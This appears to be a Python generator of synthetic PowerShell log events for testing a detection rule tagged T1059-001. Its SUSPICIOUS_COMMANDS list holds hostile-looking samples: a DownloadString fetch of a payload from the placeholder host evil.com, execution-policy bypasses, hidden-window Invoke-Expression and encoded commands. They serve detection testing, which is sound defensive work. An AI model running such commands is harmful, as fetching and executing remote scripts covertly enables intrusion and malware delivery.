import random
from datetime import datetime, timedelta

ATTACKER_IPS = ["192.168.1.105", "10.0.0.22"]
NORMAL_IPS = ["192.168.1.10", "10.0.0.5"]

SUSPICIOUS_COMMANDS = [
    "powershell -encoded SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
    "powershell -ExecutionPolicy bypass -File script.ps1",
    "powershell -WindowStyle hidden -Command Invoke-Expression",
    "powershell DownloadString('http://evil.com/payload.ps1')",
    "powershell -nop -exec bypass -encodedcommand aQBlAHgA"
]

NORMAL_COMMANDS = [
    "powershell Get-Process",
    "powershell Get-Service",
    "powershell Get-EventLog -LogName System"
]

def generate_powershell_events():
    events = []
    current_time = datetime(2024, 1, 15, 22, 0, 0)

    attacker_ip = random.choice(ATTACKER_IPS)

    for i in range(5):
        events.append({
            "event_type": "powershell_execution",
            "source_ip": attacker_ip,
            "command": random.choice(SUSPICIOUS_COMMANDS),
            "timestamp": current_time.strftime("%b %d %H:%M:%S"),
            "expected_rule": "T1059-001"
        })
        current_time += timedelta(seconds=random.randint(10, 30))

    normal_ip = random.choice(NORMAL_IPS)

    for i in range(3):
        events.append({
            "event_type": "powershell_execution",
            "source_ip": normal_ip,
            "command": random.choice(NORMAL_COMMANDS),
            "timestamp": current_time.strftime("%b %d %H:%M:%S"),
            "expected_rule": "T1059-001"
        })
        current_time += timedelta(seconds=random.randint(60, 120))

    return events